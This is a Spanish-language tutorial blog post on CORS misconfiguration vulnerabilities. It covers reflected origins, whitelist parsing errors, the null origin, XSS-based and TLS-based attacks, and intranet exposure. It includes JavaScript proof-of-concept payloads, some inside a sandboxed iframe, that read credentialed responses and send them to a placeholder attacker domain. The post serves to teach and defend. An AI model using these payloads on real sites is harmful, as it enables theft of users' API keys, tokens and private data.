---
title: Cross-origin resource sharing
date: 2023-04-21
categories: [Vulnerabilities, Web]
tags: [cors, vulnerabilities, code_injection, web]
comments: false
---

CORS o intercambio de recursos de origen cruzado es un mecanismo de navegador que permite el acceso controlado a recursos ubicados fuera de un dominio determinado. Extiende y agrega flexibilidad a la política del mismo origen (SOP). Sin embargo, brinda la posibilidad de ataques entre dominios, si la política CORS de un sitio web está mal configurada e implementada. CORS no es una protección contra ataques de origen cruzado, como el CSRF.

## Same-origin Policy (SOP)
Esta es una especificación respectiva de origen cruzado que limita la capacidad de un sitio web para interactuar con recursos fuera del dominio de origen. Esta se definió hace muchos años en respuesta a interacciones entre dominios potencialmente maliciosos. Por lo general, permite que un dominio emita solicitudes a otros dominios, pero no acceder a las respuestas.

## Relaxation of SOP
La política de mismo origen es muy restrictiva y, en consecuencia, se han ideado varios enfoques para eludir las restricciones. Muchos sitios web interactúan con subdominios o sitios de terceros de una manera que requiere acceso completo entre orígenes. Es posible una relajación controlada de la política de mismo origen mediante el uso compartido de recursos de origen cruzado.

El protocolo de uso compartido de recursos de origen cruzado utiliza un conjunto de encabezados HTTP que definen origen confiables y propiedades asociadas, como si se permite el acceso autenticado. Estos se combinan en un intercambio de encabezados entre un navegador y el sitio de origen cruzado al que intentan acceder.

## Vulnerabilidades derivadas de problemas de configuración de CORS
Muchos sitios modernos usan CORS para permitir el acceso desde subdominios y terceros de confianza. Su implementación de CORS puede contener errores o ser demasiado indulgente para garantizar que todo funcione, y esto puede dar lugar a vulnerabilidades explotables.

## Encabezado ACAO generado por el servidor a partir del encabezado origin especificado por el cliente
Algunas aplicaciones necesitan proporcionar acceso a otros dominios. Mantener una lista de dominios permitidos requiere de la constante actualización de los mismos y cualquier error puede romper la funcionalidad. Por lo tanto, algunas aplicaciones toman la ruta fácil que permite efectivamente el acceso desde cualquier otro dominio.

Una forma de hacerlo es leer el encabezado "Origin" de las solicitudes e incluir un encabezado de respuesta que indique que el origen solicitante está permitido. Por ejemplo, considerando lo siguiente:
```
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
```
Esto responde:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
...
```
Estos encabezados indican que se permite el acceso desde el dominio solicitante (malicious-website.com) y que las solicitudes de origen cruzado pueden incluir cookies (Access-Control-Allow-Credentials: true)y, por lo tanto, se procesaran en la sesión.

Debido a que la aplicación refleja orígenes arbitrarios en el encabezado "Access-Control-Allow-Origin", esto significa que cualquier dominio puede acceder a los recursos del dominio vulnerable. Si la respuesta contiene información confidencial, como una clave de API o un token CSRF, puede recuperarla colocando el siguiente script en su sitio web:
```
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
   location='//malicious-website.com/log?key='+this.responseText;
};
```

## Errores al analizar encabezados de origen
Algunas aplicaciones que admiten el acceso desde varios orígenes lo hacen mediante una lista blanca de orígenes permitidos. Cuando se recibe una solicitud de CORS, el origen proporcionado se compara con la lista blanca. Si el origen aparece en la lista blanca, se refleja en el encabezado "Access-Control-Allow-Origin" para que se conceda el acceso. Por ejemplo, la aplicación recibe una solicitud:
```
GET /data HTTP/1.1
Host: normal-website.com
...
Origin: https://innocent-website.com
```
La aplicación compara el origen proporcionado con su lista de origen permitidos y, si está en la lista lo refleja de la siguiente manera:
```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://innocent-website.com
```
A menudo surgen errores al implementar listas blancas de origen de CORS. Algunas organizaciones deciden permitir el acceso desde todos los subdominios. Y algunas aplicaciones permiten el acceso desde los dominios de otras organizaciones, incluidos sus subdominios. Estas reglas a menudo se implementan haciendo coincidir prefijos o sufijos de URL, o usando expresiones regulares. Cualquier error en la implementación puede dar lugar a que se otorgue acceso a dominios externos no deseados.

Por ejemplo, supongamos que una aplicación otorga acceso a todos los dominios que terminan en:
```
normal-website.com
```
Podriamos obtener acceso registrando el dominio:
```
hackersnormal-website.com
```
Alternativamente, supongamos que una aplicación otorga acceso a todos los dominios que comienzan con:
```
normal-website.com
```
Podriamos obtener acceso utilizando el dominio:
```
normal-website.com.evil-user.net
```

## Valor de origen nulo incluido en la lista blanca
La especificación del encabezado "Origin" admite el valor "null". Los navegadores pueden enviar el valor "null" en el encabezado "Origin" en varias situaciones inusuales:
- Redirecciones de origen cruzado.
- Solicitudes de datos serializados.
- Solicitud utilizando el protocolo "file:".
- Solicitudes de origen cruzado en espacio aislado.

Algunas aplicaciones pueden incluir en la lista blanca el origen "null" para admitir el desarrollo local de la aplicación. Por ejemplo, supongamos que una aplicación recibe la siguiente solicitud de origen cruzado:
```
GET /sensitive-victim-data
Host: vulnerable-website.com
Origin: null
```
Y el servidor responde con:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```
En esta situación, podemos usar varios trucos para generar una solicitud de origen cruzado que contenga el valor "null" en el encabezado "Origin". Esto satisfará la lista blanca, lo que conducirá al acceso entre dominios. Por ejemplo, esto se puede hacer mediante una solicitud "iframe" de origen cruzado en espacio aislado del formulario:
```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe>
```

## Explotación de XSS a través de relaciones de confianza CORS
Incluso CORS configurado "correctamente" establece una relación de confianza entre dos orígenes. Si un sitio web confía en un origen que es vulnerable a secuencias de comandos entre sitios, entonces podríamos explotar el XSS para inyectar código JS que usa CORS para recuperar información confidencial del sitio que confía en la aplicación vulnerable.

Dada la siguiente solicitud:
```
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: https://subdomain.vulnerable-website.com
Cookie: sessionid=...
```
Si el servidor responde:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```
Si encontramos una vulnerabilidad XSS en "subdomain.vulnerable-website.com" podriamos usar eso para recuperar la clave API, usando una URL como:
```
https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
```

## Romper TLS con CORS mal configurado
Suponiendo que una aplicación emplea rigurosamente HTTPS también incluye en la lista blanca un subdominio de confianza más que una HTTP simple. Por ejemplo, cuando la aplicación recibe la siguiente solicitud:
```
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: http://trusted-subdomain.vulnerable-website.com
Cookie: sessionid=...
```
La aplicación responde:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```
Si estamos en posición de interceptar el tráfico de un usuario víctima podríamos explotar la configuración de CORS para comprometer la interacción de la víctima con la aplicación. Este ataque implica los siguientes pasos:
- El usuario víctima realiza cualquier solicitud HTTP simple.
- El atacante inyecta una redirección a "http://trusted-subdomain.vulnerable-website.com".
- El navegador de la víctima sigue la redirección.
- El atacante intercepta la solicitud HTTP simple y devuelve una respuesta falsificada que contiene una solicitud CORS para "https://vulnerable-website.com".
- El navegador de la víctima realiza la solicitud CORS, incluyendo el origen "http://trusted-subdomain.vulnerable-website.com".
- La aplicación permite la solicitud porque este es un origen incluido en la lista blanca. Los datos confidenciales solicitados se devuelven en la respuesta.
- La página falsificada puede leer los datos confidenciales y transmitirlos a cualquier subdominio bajo el nuestro control.

Este ataque es efectivo incluso si el sitio web vulnerable es robusto en su uso de HTTPS, sin punto final HTTP y todas las cookies marcadas como seguras.

## Intranets y CORS sin credenciales
La mayoría de los ataques CORS se basan en la presencia del encabezado de respuesta:
```
Access-Control-Allow-Credentials: true
```
Sin este encabezado el navegador del usuario víctima se negara a enviar sus cookies, lo que significa que el atacante solo obtendrá acceso a contenido no autenticado, al que podrá acceder fácilmente navegando directamente al sitio web de destino.

Sin embargo, hay una situación común en la que podremos acceder a un sitio web directamente: cuando es parte de la intranet de una organización y se encuentra dentro del espacio de direcciones IP privadas. Los sitios web internos a menudo tienen un estándar de seguridad más bajo que los sitios externos, lo que permite a los atacantes encontrar vulnerabilidades y obtener acceso. Por ejemplo, una solicitud de origen cruzado dentro de una red privada puede ser como:
```
GET /reader?url=doc1.pdf
Host: intranet.normal-website.com
Origin: https://normal-website.com
```
Y el servidor responderá con:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
```
El servidor de aplicación confía en las solicitudes de recursos de cualquier origen sin credenciales. Si los usuarios dentro del espacio de direcciones IP privadas acceden a la Internet pública, se puede realizar un ataque basado en CORS desde el sitio externo que usa el navegador de la víctima como proxy para acceder a los recursos de la intranet.
